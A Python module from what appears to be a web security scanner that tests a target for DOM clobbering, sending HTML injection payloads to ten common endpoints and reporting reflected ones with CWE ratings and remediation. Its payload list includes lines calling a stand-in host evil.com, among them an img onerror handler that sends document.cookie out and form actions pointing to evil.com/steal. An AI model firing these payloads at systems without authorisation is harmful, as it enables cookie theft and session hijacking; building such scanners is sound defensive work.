"""DOM Clobbering scanner — detects id/name-based JavaScript variable pollution via reflected HTML injection points."""
from __future__ import annotations
import asyncio
import random
import re
import string
from typing import Any
from talisman.utils.http_client import TalismanHTTPClient
from talisman.utils.logger import get_logger, console, print_finding

log = get_logger(__name__)

DOMC_CANARY_PREFIX = "TLSMDOMC"

# HTML injection test points — common reflected input locations
HTML_INJECTION_ENDPOINTS = [
    "/search", "/api/search",
    "/api/user", "/api/profile",
    "/api/config", "/api/settings",
    "/api/echo", "/api/debug",
    "/api/render", "/api/display",
]

# DOM Clobbering payloads — injects HTML elements with id/name that
# collide with common JavaScript variable names used by frameworks
DOM_CLOBBERING_PAYLOADS = [
    # Anchor tag with href (classic: window.config = {href: 'evil.js'})
    ('<a id="canaryID" href="https://evil.com/malicious.js">click</a>', "Anchor element clobbering"),
    ('<a id="canaryID" name="canaryID" href="https://evil.com/malicious.js">click</a>', "Anchor name + id clobbering"),
    # Form element with action
    ('<form id="canaryID" action="https://evil.com/steal"></form>', "Form action clobbering"),
    ('<form name="canaryID" action="https://evil.com/steal"></form>', "Form name clobbering"),
    # Base tag (can redirect all relative URLs)
    ('<base id="canaryID" href="https://evil.com/">', "Base tag clobbering"),
    # Script-like elements without being script
    ('<img id="canaryID" src="x" onerror="fetch(\'https://evil.com/\'%2Bdocument.cookie)">', "Img onerror clobbering"),
    # Overwriting document API
    ('<a id="cookie" href="https://evil.com">cookie</a>', "document.cookie clobbering"),
    ('<a id="getElementById" href="https://evil.com">getElementById</a>', "document.getElementById clobbering"),
    # Multiple nested clobbering
    ('<form id="canaryID"><input name="default" value="clobbered"></form>', "Form child element clobbering"),
    # Iframe name-based
    ('<iframe name="canaryID" src="https://evil.com"></iframe>', "Iframe name clobbering"),
]


async def _test_dom_clobbering(
    url: str, endpoint: str, client: TalismanHTTPClient,
) -> list[dict[str, Any]]:
    """Test for DOM Clobbering by injecting HTML elements and checking reflection.

    The key insight: if the server reflects our injected HTML element's id/name
    attribute in the response, AND that id/name matches a common JS variable name,
    a DOM Clobbering gadget exists on the client side.
    """
    findings: list[dict[str, Any]] = []
    test_url = url.rstrip("/") + endpoint

    for payload, description in DOM_CLOBBERING_PAYLOADS:
        # Replace canaryID with a unique canary
        canary_id = f"{DOMC_CANARY_PREFIX}{''.join(random.choices(string.ascii_uppercase + string.digits, k=8))}"
        test_payload = payload.replace("canaryID", canary_id)

        # Try multiple insertion points
        test_variants = [
            {"q": test_payload},
            {"query": test_payload},
            {"name": test_payload},
            {"input": test_payload},
            {"data": test_payload},
            {"search": test_payload},
            {"callback": test_payload},
            {"redirect": test_payload},
            {"url": test_payload},
            {"message": test_payload},
        ]

        # Determine method based on endpoint
        method = "GET" if "/search" in endpoint or "/echo" in endpoint else "POST"

        for params in test_variants:
            try:
                if method == "GET":
                    r = await client.get(test_url, params=params, timeout=8)
                else:
                    r = await client.post(test_url, json=params,
                        headers={"Content-Type": "application/json"}, timeout=8)

                resp_text = r.text

                # Check if our payload is reflected in the response
                if canary_id in resp_text:
                    # Determine what type of clobbering vector this is
                    clobbering_type = "unknown"
                    if 'href="https://evil.com' in resp_text:
                        clobbering_type = "anchor_href_clobbering"
                    elif 'action="https://evil.com' in resp_text:
                        clobbering_type = "form_action_clobbering"
                    elif 'base' in payload.lower():
                        clobbering_type = "base_tag_clobbering"
                    elif 'cookie' in payload.lower() and 'getElementById' not in payload:
                        clobbering_type = "cookie_clobbering"
                    elif 'getElementById' in payload.lower():
                        clobbering_type = "api_clobbering"
                    elif 'onerror' in payload.lower():
                        clobbering_type = "event_handler_clobbering"
                    else:
                        clobbering_type = "generic_html_clobbering"

                    findings.append({
                        "type": clobbering_type,
                        "endpoint": endpoint,
                        "payload_preview": test_payload[:100],
                        "description": description,
                        "canary_id": canary_id,
                        "param": list(params.keys())[0],
                        "evidence": f"Parsed HTML element with id='{canary_id}' reflected at {endpoint} via param {list(params.keys())[0]}",
                    })
                    break  # One finding per payload is enough
            except Exception:
                pass

        if any(f.get("canary_id") == canary_id for f in findings):
            continue  # Found for this payload, move to next

    return findings


async def _test_dom_clobbering_sinks(
    url: str, endpoint: str, client: TalismanHTTPClient,
) -> list[dict[str, Any]]:
    """Test for DOM Clobbering that specifically targets common JS sinks.

    We inject HTML that overwrites common JS variable names used by frameworks
    like `window.config`, `window.SITE_CONFIG`, etc.
    """
    findings: list[dict[str, Any]] = []
    test_url = url.rstrip("/") + endpoint

    common_sinks = [
        "config", "settings", "options", "globals",
        "globalConfig", "appConfig", "siteConfig",
        "env", "environment", "runtime",
        "baseUrl", "apiBase", "apiUrl",
        "csrfToken", "nonce", "state",
    ]

    for sink in common_sinks[:6]:
        canary_url = f"https://evil-{''.join(random.choices(string.ascii_lowercase, k=6))}.com/malicious.js"
        payload = f'<a id="{sink}" href="{canary_url}">clobber</a>'

        test_variants = [
            ({"q": payload}, "GET"),
            ({"input": payload}, "POST"),
            ({"name": payload}, "POST"),
        ]

        for params, method in test_variants:
            try:
                if method == "GET":
                    r = await client.get(test_url, params=params, timeout=8)
                else:
                    r = await client.post(test_url, json=params, timeout=8)

                if canary_url in r.text:
                    findings.append({
                        "type": "sink_clobbering",
                        "endpoint": endpoint,
                        "sink": sink,
                        "payload": payload[:80],
                        "canary_url": canary_url,
                        "evidence": f"window.{sink} clobberable via injected HTML element",
                    })
                    break
            except Exception:
                pass

    return findings


async def run(
    target: str,
    session: Any = None,
    scope: Any = None,
    rate_limiter: Any = None,
    proxy: str | None = None,
    **kwargs: Any,
) -> dict[str, Any]:
    url = target if "://" in target else f"https://{target}"
    console.print(f"\n[module][+] DOM Clobbering Scanner[/module] -> [target]{url}[/target]")
    findings: list[dict[str, Any]] = []

    async with TalismanHTTPClient(proxy=proxy, timeout=12) as client:
        console.print(f"  Testing {len(HTML_INJECTION_ENDPOINTS)} endpoints for DOM Clobbering...")

        for endpoint in HTML_INJECTION_ENDPOINTS:
            # -- 1. Standard DOM Clobbering payloads ----------------------------------
            dc_findings = await _test_dom_clobbering(url, endpoint, client)
            for f in dc_findings:
                clobber_type = f.get("type", "generic_html_clobbering")
                severity = "high" if "cookie" in clobber_type or "api" in clobber_type else "medium"
                title = f"DOM Clobbering ({clobber_type}) at {endpoint}: {f.get('description', '')}"
                print_finding(title, severity, url)
                findings.append(f)
                if session:
                    cwe_map = {
                        "cookie_clobbering": "CWE-79",
                        "api_clobbering": "CWE-79",
                        "anchor_href_clobbering": "CWE-79",
                        "form_action_clobbering": "CWE-79",
                        "base_tag_clobbering": "CWE-444",
                        "event_handler_clobbering": "CWE-79",
                        "generic_html_clobbering": "CWE-79",
                    }
                    await session.add_finding(
                        target=url, module="dom_clobbering",
                        vuln_type=clobber_type,
                        severity=severity, confidence="confirmed",
                        title=title,
                        description=f"DOM Clobbering possible at {endpoint}. HTML element with id='{f.get('canary_id', '')}' was reflected in the response. An attacker can inject elements that collide with JavaScript variables to hijack client-side logic.",
                        evidence=f.get("evidence", ""),
                        remediation="1. HTML-encode all user input before reflection. 2. Use Trusted Types policy with require-trusted-types-for 'script'. 3. Use DOMPurify with SANITIZE_DOM: true and SANITIZE_NAMED_PROPS: true. 4. Avoid accessing global config via window.[name] pattern.",
                        cvss_score=8.1 if severity == "high" else 6.8, cwe=cwe_map.get(clobber_type, "CWE-79"),
                    )

            # -- 2. Sink-specific clobbering -----------------------------------------
            sk_findings = await _test_dom_clobbering_sinks(url, endpoint, client)
            for f in sk_findings:
                sink = f.get("sink", "unknown")
                title = f"DOM Clobbering sink at {endpoint}: window.{sink} overwriteable"
                print_finding(title, "high", url)
                findings.append(f)
                if session:
                    await session.add_finding(
                        target=url, module="dom_clobbering",
                        vuln_type="sink_clobbering",
                        severity="high", confidence="confirmed",
                        title=title,
                        description=f"window.{sink} is clobberable via HTML injection at {endpoint}. An attacker can inject an element with id='{sink}' to control the '{sink}' JavaScript variable, hijacking any code that reads from it.",
                        evidence=f.get("evidence", ""),
                        remediation="1. Use const/let declarations for sensitive config. 2. Validate object types before using config values. 3. Use Object.freeze() on config objects. 4. HTML-encode all reflected input.",
                        cvss_score=8.1, cwe="CWE-79",
                    )

    console.print(f"  DOM Clobbering scan complete -- {len(findings)} issues")
    return {"target": url, "findings": findings, "count": len(findings)}
